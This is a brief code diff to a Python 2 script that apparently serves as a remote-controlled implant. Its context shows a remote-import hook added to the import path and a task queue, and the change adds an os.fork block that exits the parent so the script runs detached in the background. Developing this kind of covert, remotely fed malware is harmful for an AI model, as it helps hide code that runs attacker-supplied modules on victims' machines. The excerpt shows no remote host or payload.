@@ -3,6 +3,7 @@ import base64
 import sys
 import time
 import imp
+import os
 import threading
 import Queue
 import zlib
@@ -320,6 +321,12 @@ def module_runner():
 	return
 
 #main
+try:
+	pid = os.fork() #fork and exit
+	if pid != 0: #run in child process
+		sys.exit()
+except:
+	pass #dont worry if we cant fork
 config = Config() #create config object
 sys.meta_path = [ReImp()] #add remote import to the import path
 tasks = Queue.Queue() #task queue
